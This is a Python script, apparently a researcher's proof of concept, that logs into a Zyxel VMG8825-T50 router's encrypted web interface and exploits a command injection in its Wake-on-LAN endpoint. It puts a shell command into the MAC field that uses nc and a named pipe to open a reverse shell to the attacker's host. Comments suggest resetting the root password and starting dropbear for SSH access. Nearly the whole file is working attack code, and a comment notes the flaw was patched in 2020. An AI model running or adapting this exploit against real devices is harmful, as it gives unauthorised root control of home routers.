import requests
import base64
import json
import time
import logging
from Crypto.PublicKey import RSA # cryptodome
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Cipher import PKCS1_v1_5

DEBUG = True
TARGET_URL = 'http://192.168.1.1'
TARGET_USER = "admin"
TARGET_PASS = "YOUR PASSWORD HERE"


class VMG8825_T50_Web(object):

	def __init__(self, url, user, password):
		self.url = url
		self.user = user
		self.password = password

		self.r = requests.Session()
		self.r.trust_env = False # ignore proxy settings

		# we define the AesKey ourselves
		self.aes_key = b'\x42'*32
		self.sessionkey = None

		if DEBUG:
			# Logging verbose http requests
			import http.client as http_client
			http_client.HTTPConnection.debuglevel = 1
			logging.basicConfig()
			logging.getLogger().setLevel(logging.DEBUG)
			requests_log = logging.getLogger("urllib3")
			requests_log.setLevel(logging.DEBUG)
			requests_log.propagate = True


	def _encrypt_request(self, data):
		iv = b'\x42'*16

		cipher = AES.new(self.aes_key, AES.MODE_CBC, iv)
		content = cipher.encrypt(pad(json.dumps(data).encode('ascii'), 16))

		request = {
			"content": base64.b64encode(content).decode('ascii'),
			"iv": base64.b64encode(iv).decode('ascii'),
			"key": ""
		}

		print(f"[encrypt] before='{json.dumps(data)}' after='{json.dumps(request)}'")

		return request

	def _decrypt_response(self, data):
		if not 'iv' in data or not 'content' in data:
			print(f"response not encrypted! Response: {data}")
			return data

		iv = base64.b64decode(data['iv'])[:16]
		content = data['content']

		cipher = AES.new(self.aes_key, AES.MODE_CBC, iv)
		result = unpad(cipher.decrypt(base64.b64decode(content)), 16)

		return result

	def perform_login(self):
		# get pub key
		res = self.r.get(f"{TARGET_URL}/getRSAPublickKey")
		pubkey_str = res.json()['RSAPublicKey'] 

		

		# Encrypt the aes key with RSA pubkey of the device
		pubkey = RSA.import_key(pubkey_str)
		cipher_rsa = PKCS1_v1_5.new(pubkey)
		enc_aes_key = cipher_rsa.encrypt(base64.b64encode(self.aes_key))

		
		login_data = {
			"Input_Account": self.user,
			"Input_Passwd": base64.b64encode(self.password.encode('ascii')).decode('ascii'),
			"RememberPassword": 0,
			"SHA512_password": False
		}

		enc_request = self._encrypt_request(login_data)
		enc_request['key'] = base64.b64encode(enc_aes_key).decode('ascii')
		enc_response = self.r.post(f"{TARGET_URL}/UserLogin", json.dumps(enc_request))
		response = json.loads(self._decrypt_response(enc_response.json()))

		if 'result' in response and response['result'] == 'ZCFG_SUCCESS':
			self.sessionkey = response['sessionkey']
			return True
		else:
			return False


	def perform_logout(self):
		# http://192.168.0.1/cgi-bin/UserLogout?sessionkey=173783345
		response = self.r.post(f"{TARGET_URL}/cgi-bin/UserLogout?sessionKey={self.sessionkey}")
		response = response.json()

		if 'result' in response and response['result'] == 'ZCFG_SUCCESS':
			return True
		else:
			return False


	# Command injection vulnerability!
	# Solved in a summer/fall 2020 update
	def test_wolcommand(self):

		REVERSE_HOST = "192.168.0.192" # YOUR IP HERE
		REVERSE_PORT = 1337

		# Suggestion: use this command in the reverse shell
		# to get a nicer SSH session. Change the root password first with `passwd`
		#   dropbear -F -E -p 2222

		postdata = {
			# "MAC": "60:57:18:76:13:8A",
			"MAC": f"; /bin/mknod /tmp/a p; /usr/bin/nc {REVERSE_HOST} {REVERSE_PORT} </tmp/a | /bin/ash >/tmp/a 2>&1;",
			"IP": "192.168.0.192"
		}

		try:
			res_enc = self.r.put(
				f"{TARGET_URL}/cgi-bin/Home_Networking?action=WOLCommand?sessionKey={self.sessionkey}",
				json.dumps(self._encrypt_request(postdata)),
				timeout=60
			)
			res = json.loads(self._decrypt_response(res_enc.json()))
			print(f"res = {res}")
		except:
			pass


if __name__ == "__main__":
	router = VMG8825_T50_Web(TARGET_URL, TARGET_USER, TARGET_PASS)

	router.perform_login()

	router.test_wolcommand()

	router.perform_logout()
